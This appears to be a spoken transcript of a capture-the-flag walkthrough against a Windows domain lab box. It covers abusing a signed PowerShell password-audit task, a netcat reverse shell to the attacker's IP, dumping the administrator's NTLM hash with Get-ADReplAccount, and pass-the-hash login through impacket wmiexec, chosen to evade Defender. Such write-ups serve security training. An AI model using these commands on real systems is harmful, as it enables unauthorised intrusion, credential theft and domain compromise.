we can see information about this certificate so we see it signed by the win Court path or CA and then what else do we see RSA encryption it is a code signing certificate and thinking back remember when we are enumerating files in the get bad password directory through our web shell um Let's see we can show you passwords we did a type against I think run dot VBS whoops and we get the um authentic code signature block and then well just before that is the actual script and what this is is a VBS script that is going to create a event in the event log um with an ID of 444 that is saying check passwords and the script is really just these four lines right but because it's signed it then puts this piece in so you can't tamper with the script what I'm guessing is happening here is um the event gets created and they have a scheduled task that's looking for this event code and upon finding it it will then execute the bad passwords program which is probably just a Powershell script that is also signed so if we look at the Powershell script we see there is another big signature block and that's just signed Powershell code so what we're going to do is um create our own Powershell file that's just going to send us a reverse shell and then sign it and then create that event code and see if it gets executed and if it does we should be whatever user runs this Powershell and since this is a password audit program it is the ability to view active directory passwords or not the passwords them so bulbs but probably the ntlm hashes and if we can view the ntlm hashes then we can probably get the administrator's hash and login so let us figure out exactly how this whole certificate signing piece Works going back to Google we can just Google like um authentic code Powershell and they do have a page that has set authentic code signature that just explains how to do this right and I bet if we go down we even get an example so we have to put the certificate in our certificate store and in order to import the certificate we're going to have to give it the password now whenever doing something in Powershell that requires a password um you can do the incredibly insecure thing of converting a um password to this secure string thing uh so we want that string and then uh what was the password ABC easy as one two three as plain text Dash force and I say this is insecure because a lot of things like log Powershell nowadays and things like that so anything that's logging these commands sees all the passwords you're putting in because you're putting it in as an argument um but I digress so let's go into the recycle bin I was hoping I could do it that way let's see Dr A uh oh we're in Powershell um I wonder if I can recycle bin like that CD recycled is it dot bin say GCI I think Dash 4 shows hidden files in Powershell yep so we want to go to recycle.bin what was I doing before do I need a backslash okay this is there we go single quotes of the answer um so we can do GCI Dash Force again and go into this so uh GCI Dash Force we should have who am I web I am not the user I thought I was who am I Gina Wilde okay I was on the wrong shell so let's go back and copy this command and put it in Gina Wilds so I'm just gonna do Powershell so we enter Powershell do the password again look at the files we have the certificate right here so we can say the certificate is equal to import pfx certificate certificate and then file path um I'm going to see if I don't need the full path if I can just do this because I'm in this directory maybe I can Dash password pass Dash cert store location and we want insert current user my I do search I get a certificate here so it says all I need to do is this set authentic code signature specify the file and then specify the certificate so what I'm going to do is go back to users public and we can just create a file that does c colon backslash um what was it I think share let's just do it Dia slash share so this is really netcat because we overwrote this file with netcat so we should be able to do Echo SQL and backslash share BG info 64.exe and then Dash e c m d 10 10 14 8 9001. so we Echo this looks good I'm going to call this um test.ps1 just because I forget the name I want it we have this file right okay we want to look at get bad passwords and we're going to name the file get bad password.ps1 now I don't think we actually have to have this file named this to begin with because we could just copy test.ps1 over top of that file the main reason I'm doing this is whenever I do like certificate signing I always hate changing anything after I sign something just in case and the off chance it was um using that field somehow um it's just one of those things like I'm always scared of touching signed files or modifying sign files even though changing the um what is it what I'm saying the file name shouldn't change the signature so we sign this so now if I type this file we have the signature and this is a giant sign to blob or just this um I wonder if I can just execute this will this work get bad passwords.ps1 nclbmp 9001 it does so all we're doing is just testing it I wasn't sure if Powershell would be like weird with just executing a shell command like that um always nice to test your shells first so we can copy this into the get get passwords directory and now when we go to get bad passwords and we look at this file copy paste it is a Big Blob but all it's doing is a reverse shell and again the reason why we're not putting like a Powershell reverse shell in this file is because of app Locker because it's denying a lot of things um access to the internet which is our box but this file name is allowed out through the firewall so I'm going to listen on this and then we should be able to just do like C script run.vbs because this run.vbs is creating the event code that should trigger the get bad password thing to run and I run this and we don't get a shell um I was hoping we would oh there we go it just took a second and I do who am I and I am the uh B pass Runner user um if I look here I'm Gina Wilde so as the B pass Runner user I have the permission to um check for bad passwords I bet if I go to the get bad password um repo because that's what this is running we can see how it works it's got to do like a Powershell query to somehow get the ntlm hash of and account um let's see replicating ad account with parameters so it does this get ad Rebel account so I'm going to search this to see exactly what this function is and it's a DS internal function so I think this is like says internals and we have Dash all Dash server uh Sam account name so if we do like load up Powershell uh get 80 Rebel account Dash Sam account name administrator see what this output looks like I'm surprised it's taking this long I wonder if we had some type of syntax error maybe we had to specify the domain or something there I don't think we'd have to specify a Powershell like a credential let's see uh cannot value argument on server the argument is null oh we did not use RL rap so I can't use the up and down arrow so we can do administrator Dash server wincorp.hdb and here we go and we also have the password history of this user but if we look we have let's see what is the ntlm hash ntlm strong hash so this is going to be the password for the user I believe or maybe uh this b33 I don't know what ntlm strong hash is this should be it Secrets NT hash so if I copy this NT hash file we should now be able to run code as administrator so um what was it I had it in opt M packet examples get TGT so this is the same exact thing we did with uh Beatrice Mills but now we're doing it with administrator to get a ticket and we need Dash hashes like this and we have a administrator ticket and the reason why I put this semicolon before this because the format of hashes is landman hash and then ntlm hash so LM hash ntlm um LM hashes are not really used but for some reason a lot of the tools like like that formatting so you can just blank It Out by putting nothing there and then ntlm so let's do um export oh let's just do kob5cc name is equal to administrator.cc Cache and then we can go back into impact it examples wmi exec and I want to say I just specify the hostname right after wincorp.htb and we'd need a dash k and minor straighter at this foreign I thought that would just use a ticket we can say Dash hashes again maybe we didn't need to do this whole get TGT thing see what is this going to do is it actually going to use a Kerberos login and access it is so I do who am I and I'm wincorp administrator the reason why I didn't use PS exec because Defender is on this box and Defender picks up PS exec because PS exec drops a file to get code execution it drops a file creates a service uses that service to execute the file it dropped and because it's dropping the file Defender Flags it but wmi exec is fireless it doesn't drop a file so that's why this one's not picked up by Defender but we can go users administrator uh we could also use like evil winrm and other tools [Music] um go into desktop and then we have root.txt so that's going to be the Box hope you guys enjoyed it take care and I will see you all next time